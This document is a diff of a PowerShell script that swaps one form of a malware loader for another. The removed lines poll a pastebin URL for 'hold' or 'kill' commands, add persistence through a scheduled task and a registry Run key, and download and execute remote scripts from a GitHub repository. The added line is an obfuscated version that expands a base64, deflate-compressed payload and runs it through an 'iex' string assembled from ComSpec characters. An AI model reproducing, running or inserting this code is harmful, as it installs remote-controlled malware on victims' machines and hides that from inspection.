@@ -1,17 +1,1 @@
-$re = (IWR "https://pastebin.com/raw/Wy2fMXaw")
-
-if ($re.Content -match 'hold') {
-    Exit
-}
-
-if ($re.Content -match 'kill') {
-    schtasks /Delete /TN "Start" /f
-    reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /f
-    Exit
-}
-
-schtasks /Create /TN "Start" /SC HOURLY /MO 1 /TR "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)""" /F
-
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Start" /t REG_SZ /d "cmd /b /c powershell -w hi -c \""IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo1.ps1 -UseBasicParsing)\""" /F
-
-IEX "IEX(IWR https://raw.githubusercontent.com/rindonbrg/repo/master/repo.ps1 -UseBasicParsing); repo $re"
+.( $Env:COMsPec[4,26,25]-joIn'')( NEW-ObjECt  io.StreAmreaDER((NEW-ObjECt  sYstEM.Io.COMprESSioN.defLaTestReaM( [iO.MeMOrystReam] [SysTEm.COnVErt]::FROMbase64strINg( 'bVd7axtHEP8qgwmRhdfl9u529zb/uaC2Lm1cpFICxpTYyG2gjcEVJdD0u2feu5IDkjjd7WNmfo/Zg7NX5/DP5tfL68Pmb4DVv++3H67uf9q/eXrcrWC1WsMZXMDt7rC9/vj93TmcQ44hDiXEcYaQCgSYsl7MNSxDgLLgN9G9kGqIcQKcUOlLFylAHHDGRCPmAPTFu/hoHOh5pr80ktaHOE74E0e6jDWkhPdHul5wRMxBZheeTbcHWbTg45rDTJPHEmDBtbLtocMqBoyR4jxcmGdX3wrnYPSYEP7JEXQPkJxTqBRpXCQmCZee8X+QRIGyl7Cz50aDJfyJK5ZHWmcKmk6hx0luY2y8CP5UiZLio0WLLM7PKo6slL2EzRvzVhzRMFheci94dg2wIziBc+Pyai6gQc/QJ8vbe3KgVdUyyP1Jg8+crkyXJ8V+Pc3TLDW9liYILbB0jU2EG97ltemCx9I+dTKkdC8JnucYZWlgoYvFCoq7ltmysISKgpkM0Dlw8YQzXZT4URbStmPmRRlL5gUHIgTxcoo6logxUB2IUlAwy0x7ldkINhYjThyk1BwYr5Zx/tw4S2TiIHAiSwxsCckiVxGGTFB4xyTjo5STt690vbQKKDs6spfaFbaAIjEKkZkovFmidVS5VSvIz6PmD33VoSs7FyrVhqrVXfmh2pCvy4Ay08UEIpKACkLumMMIlYLv6wWb5cpZUgc3mBmUdVXB5N0pOKLSUgxTQc9X7hKCZOLhWTPBLsssWJElMwOwaksKedaBZF74SObNg4mfCew+y/w16WXF1Qg7tUjZfZisSelBwAtHh2I6o8KImxW1JZ4/8mBmdhRXDm5yI18jewRoTJM6AeGSU+C+AEI+zI4TkCWG6pLjFoDbT4kj5WjN2MWwyfvzkdexG4BwbGRjWCQHAYsz0qIswbzZcnMypwTHXQVaW3GtkJp9BP2bnPsjt6Emk0EkxWuYPwqr3IR4om5iZjUkFayAnGQhmkY3hJAjmwQYWymRGptfZXd4zKZMSteGq7ZRHoHdcVFCVjB5Et9qsqYILpnSO5t2M3U3wVOsbBlZL0hiJEKZmwE1iQvdVOeSAlnF4h1CAdPiiwt9zcvghZlxROZAdpbAxcXOOjez7qB8aGbGiQ7CsdCaoHiZMy26kBlDdjNQOzvpIS59ODYzbaK0KHsXqXkwM8yl8x8tsLQosS3V99GgyXyll7ilMEDHOi/n1A4t3pJV6CCK42U6qQNZgCwvRZG+SD+o9jqK1sHEbu5k5wE/BEIvdqnIV85xYIKH/nSjKy3hSPAdgN4KTarW+kM70Lw4Rhospe0mkm/ewUaq7Mnq+9aIm50eid4PLt15djDM+iOlzyetqyHJLZo+D8YAk795nKgfTuTP6Yv6XWbNGrgiqv7s+CVjqEWHLiDTuZfqiZJRZku3nkNQI/BAh2uY1fbV5w15O8AY9BKOnv+TyU5snqABR12xO3L5ZvJd2zKTV3P2Du34g6w7+rldMT+B3JQFfpABbS2nXt8ANejBsXc8Wr/hMBvsShqb+AJvk2HJDesag50nWnnE6O1g0rmXEphxnmZ1hGKH0CTy4JYdj6iYFG8Efg2f4fHmeX/18MN/tw9/Xm3v8O3v1e+X9++etnA2fIr1DNbw/xou8B1ytz/QK+TP+AZ59fzh/f1fmzdP3+EbJOBLJNBL5Gd4TdN/2z9/e7Pb/7LdP262+7cPm28OT7vD8/XHP87XtzFMdxerT6vLH2+u3+K75xc=' ) ,[sysTEM.IO.COMPRESSION.cOMPresSIONmOde]::dEcomPrESs ) ) ,[teXT.eNcodiNG]::aSCiI) ).readToEnD( ) 
